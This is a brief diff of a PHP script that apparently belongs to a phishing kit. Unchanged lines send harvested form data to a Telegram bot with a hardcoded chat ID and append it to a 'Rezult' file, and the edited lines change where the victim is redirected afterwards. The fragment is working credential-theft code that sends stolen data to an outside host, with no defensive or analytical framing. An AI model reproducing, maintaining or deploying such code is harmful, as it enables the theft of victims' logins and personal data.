@@ -27,15 +27,15 @@ file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=203961
 $file = fopen("../SE/ajz.txt","a");   ///  Directory Of Rezult OK.
 fwrite($file,$message); 
 
-	header("Location: ../loading.php");
+	header("Location:  /loading.php");
 	
 }else{
 	
-	header('Location: ../loading.php');
+	header('Location: /index.html');
 }	
 	
 	
 }else{
-	header('Location: ../loading.php');
+	header('Location: /index.html');
 }
 ?>
